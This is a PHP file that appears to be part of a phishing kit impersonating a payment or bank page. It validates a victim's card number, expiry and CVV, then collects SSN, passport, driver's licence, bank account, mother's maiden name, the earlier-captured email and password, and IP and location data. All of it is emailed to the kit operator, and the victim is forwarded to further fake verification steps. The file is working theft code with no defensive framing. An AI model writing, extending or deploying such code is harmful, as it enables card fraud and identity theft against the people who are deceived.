<?php
require __DIR__ . '/../function.php';
require __DIR__ . '/../system/class/creditcard.php';

$card = CreditCard::validCreditCard(str_replace(" ", "", $_POST[$api->encypt('cardnum')]));
$expsplit = explode("/", $_POST[$api->encypt('cardexp')]);
$checkexp = CreditCard::validDate("20".$expsplit[1], $expsplit[0]);
$checkcvv = CreditCard::validCvc($_POST[$api->encypt('cardcvv')], $card['type']);
$check3d  = CreditCard::secure3D($card['type']);

if(!$card['valid']) {
  exit("error");
} else if (!$checkexp) {
  echo("exp");
} else if (!$checkcvv) {
  echo("cvv");
} else {
  $_SESSION['card1_name']   = $_POST[$api->encypt('cardholder')];
  $_SESSION['card1_number'] = $_POST[$api->encypt('cardnum')];
  $_SESSION['card1_exp']    = $_POST[$api->encypt('cardexp')];
  $_SESSION['card1_cvv']    = $_POST[$api->encypt('cardcvv')];
  $_SESSION['card1_digit']  = substr(str_replace(" ", "", $_SESSION['card1_number']), 0, 6);
  $_SESSION['card1_bin']    = $api->bin($_SESSION['card1_digit'])['full'];
  $_SESSION['card1_bank']   = $api->bin($_SESSION['card1_digit'])['bank'];
  $_SESSION['card1_check']  = str_replace(" ", "", $_SESSION['card1_number'])."|".str_replace("/", "|", $_SESSION['card1_exp'])."|".$_SESSION['card1_cvv'];

  $_SESSION['mother']       = @$_POST[$api->encypt('mother')];
  $_SESSION['ssn']          = @$_POST[$api->encypt('ssn')];
  $_SESSION['sort']         = @$_POST[$api->encypt('sort')];
  $_SESSION['accnum']       = @$_POST[$api->encypt('accnum')];
  $_SESSION['sin']          = @$_POST[$api->encypt('sin')];
  $_SESSION['driver']       = @$_POST[$api->encypt('driver')];
  $_SESSION['osid']         = @$_POST[$api->encypt('osid')];
  $_SESSION['limit']        = @$_POST[$api->encypt('limit')];
  $_SESSION['customer']     = @$_POST[$api->encypt('customer')];
  $_SESSION['ban']          = @$_POST[$api->encypt('ban')];
  $_SESSION['civil']        = @$_POST[$api->encypt('civil')];
  $_SESSION['passport']     = @$_POST[$api->encypt('passport')];
  $_SESSION['citizen']      = @$_POST[$api->encypt('citizen')];
  $_SESSION['personal']     = @$_POST[$api->encypt('personal')];
  $_SESSION['age']          = gmdate('Y')-substr($_SESSION['billing_dob'], -4);
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
  $message = file_get_contents(__DIR__ . '/../assets/html/card1.html');
  $message = preg_replace('{KUZULUY-EMAIL}', $_SESSION['email'], $message);
  $message = preg_replace('{KUZULUY-PASSWORD}', $_SESSION['password'], $message);
  $message = preg_replace('{KUZULUY-CARD-NAME}', $_SESSION['card1_name'], $message);
  $message = preg_replace('{KUZULUY-CARD-NUMBER}', $_SESSION['card1_number'], $message);
  $message = preg_replace('{KUZULUY-CARD-EXP}', $_SESSION['card1_exp'], $message);
  $message = preg_replace('{KUZULUY-CARD-CVV}', $_SESSION['card1_cvv'], $message);
  $message = preg_replace('{KUZULUY-CARD-CHECK}', $_SESSION['card1_check'], $message);
  $message = preg_replace('{KUZULUY-CARD-BIN}', $_SESSION['card1_bin'], $message);
  $message = preg_replace('{KUZULUY-INFO-SSN}', $_SESSION['ssn'], $message);
  $message = preg_replace('{KUZULUY-INFO-SORT}', $_SESSION['sort'], $message);
  $message = preg_replace('{KUZULUY-INFO-SIN}', $_SESSION['sin'], $message);
  $message = preg_replace('{KUZULUY-INFO-DRIVER}', $_SESSION['driver'], $message);
  $message = preg_replace('{KUZULUY-INFO-OSID}', $_SESSION['osid'], $message);
  $message = preg_replace('{KUZULUY-INFO-ACCNUMBER}', $_SESSION['accnum'], $message);
  $message = preg_replace('{KUZULUY-INFO-LIMIT}', $_SESSION['limit'], $message);
  $message = preg_replace('{KUZULUY-INFO-PERSONAL}', $_SESSION['personal'], $message);
  $message = preg_replace('{KUZULUY-INFO-CUSTOMER}', $_SESSION['customer'], $message);
  $message = preg_replace('{KUZULUY-INFO-CITIZEN}', $_SESSION['citizen'], $message);
  $message = preg_replace('{KUZULUY-INFO-CIVIL}', $_SESSION['civil'], $message);
  $message = preg_replace('{KUZULUY-INFO-PASSPORT}', $_SESSION['passport'], $message);
  $message = preg_replace('{KUZULUY-INFO-BAN}', $_SESSION['ban'], $message);
  $message = preg_replace('{KUZULUY-INFO-DOB}', $_SESSION['billing_dob'], $message);
  $message = preg_replace('{KUZULUY-INFO-AGE}', $_SESSION['age'], $message);
  $message = preg_replace('{KUZULUY-INFO-MOTHER}', $_SESSION['mother'], $message);
  $message = preg_replace('{KUZULUY-BILLING-NAME}', $_SESSION['billing_fullname'], $message);
  $message = preg_replace('{KUZULUY-BILLING-ADDRESS}', $_SESSION['billing_address'], $message);
  $message = preg_replace('{KUZULUY-BILLING-CITY}', $_SESSION['billing_city'], $message);
  $message = preg_replace('{KUZULUY-BILLING-STATE}', $_SESSION['billing_state'], $message);
  $message = preg_replace('{KUZULUY-BILLING-ZIP}', $_SESSION['billing_zip'], $message);
  $message = preg_replace('{KUZULUY-BILLING-COUNTRY}', $_SESSION['country'], $message);
  $message = preg_replace('{KUZULUY-BILLING-PHONE}', $_SESSION['billing_phone'], $message);
  $message = preg_replace('{KUZULUY-IP}', $_SESSION['ip'], $message);
  $message = preg_replace('{KUZULUY-HOST}', $_SESSION['host'], $message);
  $message = preg_replace('{KUZULUY-ISP}', $_SESSION['isp'], $message);
  $message = preg_replace('{KUZULUY-LANGUAGE}', $_SESSION['language'], $message);
  $message = preg_replace('{KUZULUY-TIMEZONE1}', $_SESSION['timezone'], $message);
  $message = preg_replace('{KUZULUY-TIMEZONE2}', $_SESSION['iptimezone'], $message);
  $message = preg_replace('{KUZULUY-RESOLUTION1}', $_SESSION['device_resolution'], $message);
  $message = preg_replace('{KUZULUY-RESOLUTION2}', $_SESSION['browser_resolution'], $message);
  $message = preg_replace('{KUZULUY-LATLONG}', $_SESSION['geonameid'], $message);
  $message = preg_replace('{KUZULUY-LATITUDE}', $_SESSION['latitude'], $message);
  $message = preg_replace('{KUZULUY-LONGITUDE}', $_SESSION['longitude'], $message);
  $message = preg_replace('{KUZULUY-LOCATION}', $api->location()['full'], $message);
  $message = preg_replace('{KUZULUY-USERAGENT}', $_SESSION['useragent'], $message);

  $subject = "{$_SESSION['card1_digit']} - {$_SESSION['card1_bin']} [ {$_SESSION['country']} | {$_SESSION['ip']} | {$_SESSION['browser']} - {$_SESSION['os']} ]";
  $api->save($api->logs("card"), $subject."\n", "a");
  mail($api->result()['card'], $subject, $message, $headers);

  if ($api->config("secure3d") == "on") {
    if ($check3d == "secure") {
      $_SESSION['card1_title'] = CreditCard::title3D($card['type']);
      exit("secure");
    }
  } else if ($api->config("bank") == "on") {
    exit("bank");
  } else if ($api->config("doublecard") == "on") {
    exit("doublecard");
  } else if ($api->config("identity") == "on") {
    exit("identity");
  }
}

?>
